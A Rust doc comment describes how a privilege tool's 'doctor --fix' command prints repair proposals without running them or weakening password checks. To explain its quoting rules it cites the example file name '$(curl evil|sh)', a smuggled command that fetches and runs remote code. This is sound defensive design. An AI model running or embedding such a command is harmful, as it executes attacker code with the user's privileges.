//! What `xudo doctor --fix` offers, and what each change would mean.
//!
//! A proposal is text and an argv to print, never something this crate or the
//! front-end runs. Every change that needs root is a command for the human to
//! run in a shell they started, where the backend asks for their password; a
//! change that needs judgement — which line of a sudoers file, which entry of
//! a `PATH` — is written out by hand. xudo never edits another tool's rules.
//!
//! Nothing here can grant a passwordless path or weaken a confirmation: the
//! only grant on offer is the `xudo` group, whose every use asks for a
//! password, and everything else removes a way to root.
//!
//! # A printed command is a command someone will paste
//!
//! Paths come from the machine, and a world-writable directory lets anyone
//! choose a name in it — `$(curl evil|sh)` included. So a command is printed
//! only when every argument is printable ASCII without a backslash, and the
//! front-end quotes each one for the shell; anything else becomes a by-hand instruction, which names
//! the path through the terminal sanitizer instead of handing it to a shell.
